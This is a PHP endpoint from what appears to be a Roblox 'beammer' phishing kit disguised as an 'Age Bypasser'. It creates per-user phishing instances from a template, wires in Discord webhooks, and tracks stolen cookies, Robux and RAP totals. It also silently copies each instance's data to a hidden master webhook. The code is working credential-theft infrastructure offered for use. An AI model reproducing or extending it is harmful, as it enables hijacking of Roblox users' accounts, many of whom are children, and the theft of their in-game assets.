<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

$directory = sanitizeDirectory($input['directory'] ?? '');
$webhook = trim($input['webhook'] ?? '');
$username = trim($input['username'] ?? 'beammer');
$profilePicture = trim($input['profilePicture'] ?? 'https://hyperblox.eu/files/img.png');

// Validation
if (empty($directory) || strlen($directory) < 3) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
    exit;
}

if (strlen($directory) > 20) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 20 characters']);
    exit;
}

if (directoryExists($directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
    exit;
}

if (empty($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
    exit;
}

if (!validateWebhook($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
    exit;
}

// Generate token
$token = generateToken();

// Create instance data
$instanceData = [
    'directory' => $directory,
    'webhook' => MASTER_WEBHOOK,
    'userWebhook' => $webhook,
    'username' => $username,
    'profilePicture' => $profilePicture,
    'createdAt' => date('c'),
    'stats' => [
        'totalVisits' => 0,
        'totalCookies' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0
    ],
    'dailyStats' => [
        'visits' => array_fill(0, 7, 0),
        'cookies' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ]
];

// Save instance
if (!saveInstanceData($directory, $instanceData)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
    exit;
}

// Save token
$tokenData = [
    'token' => $token,
    'directory' => $directory,
    'webhook' => $webhook,
    'username' => $username,
    'createdAt' => date('c')
];

if (!saveTokenData($token, $tokenData)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to save authentication token']);
    exit;
}

// Copy template file
$templateFile = TEMPLATE_PATH . 'index.php';
$targetFile = DATA_PATH . $directory . '/index.php';

if (file_exists($templateFile)) {
    $templateContent = file_get_contents($templateFile);
    $templateContent = str_replace('{{MASTER_WEBHOOK}}', MASTER_WEBHOOK, $templateContent);
    $templateContent = str_replace('{{USER_WEBHOOK}}', $webhook, $templateContent);
    $templateContent = str_replace('{{INSTANCE_NAME}}', $directory, $templateContent);
    $templateContent = str_replace('{{BOT_NAME}}', BOT_NAME, $templateContent);
    $templateContent = str_replace('{{BOT_AVATAR}}', BOT_AVATAR, $templateContent);
    file_put_contents($targetFile, $templateContent);
}

// Send webhook notification
$webhookData = [
    'username' => BOT_NAME,
    'avatar_url' => BOT_AVATAR,
    'embeds' => [[
        'title' => '✨ New Instance Created!',
        'description' => "A new bypasser instance has been successfully created.",
        'color' => hexdec('00BFFF'),
        'fields' => [
            [
                'name' => '🔗 Instance URL',
                'value' => '```' . FULL_URL . '/' . $directory . '```',
                'inline' => false
            ],
            [
                'name' => '📊 Dashboard',
                'value' => '```' . FULL_URL . '/dashboard/?token=' . $token . '```',
                'inline' => false
            ],
            [
                'name' => '🔑 Access Token',
                'value' => '```' . $token . '```',
                'inline' => false
            ],
            [
                'name' => '📁 Directory',
                'value' => '`' . $directory . '`',
                'inline' => true
            ],
            [
                'name' => '👤 Username',
                'value' => '`' . $username . '`',
                'inline' => true
            ],
            [
                'name' => '📅 Created',
                'value' => '<t:' . time() . ':R>',
                'inline' => true
            ]
        ],
        'footer' => [
            'text' => 'Roblox Age Bypasser • Instance Generator',
            'icon_url' => BOT_AVATAR
        ],
        'timestamp' => date('c')
    ]]
];

sendWebhook($webhook, $webhookData);
sendWebhook(MASTER_WEBHOOK, $webhookData); // Also notify master webhook

// Update global stats
updateGlobalStats('totalInstances');

echo json_encode([
    'success' => true,
    'message' => 'Instance created successfully!',
    'data' => [
        'instanceUrl' => FULL_URL . '/' . $directory,
        'dashboardUrl' => FULL_URL . '/dashboard/?token=' . $token,
        'token' => $token,
        'directory' => $directory,
        'username' => $username
    ]
]);
?>
